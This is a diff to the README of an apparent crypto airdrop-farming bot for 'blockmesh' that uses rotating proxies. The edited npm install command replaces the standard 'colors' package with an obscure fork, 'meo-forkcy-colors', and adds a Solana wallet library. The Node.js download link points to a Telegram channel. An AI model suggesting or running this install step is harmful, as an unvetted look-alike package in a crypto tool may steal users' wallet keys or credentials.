@@ -29,7 +29,7 @@ Download Node.js and npm here: [Download Link](https://t.me/KeoAirDropFreeNe/257
 1. **Install Dependencies and Modules:**
 
    ```
-   npm i user-agents axios colors https-proxy-agent socks-proxy-agent crypto-js ws uuid
+   npm i user-agents axios meo-forkcy-colors https-proxy-agent socks-proxy-agent crypto-js ws uuid axios-cookiejar-support @solana/web3.js
    ```
 
 2. **Prepare Configuration Files:**
@@ -42,7 +42,6 @@ Download Node.js and npm here: [Download Link](https://t.me/KeoAirDropFreeNe/257
 
 ```json
 {
-  "timeZone": "en-US",
   "rotateProxy": true,
   "skipInvalidProxy": false,
   "proxyRotationInterval": 2,
@@ -95,6 +94,6 @@ socks5://user:pass@host:port
 💡 Usage:
 
 > You need to `cd` to the file after extract it.
-> To run the bot, use the following command: `cd blockmesh-main/blockmesh; node meomundep`
+> To run the bot, use the following command: `cd blockmesh; node meomundep`
 
 🎇Enjoy!
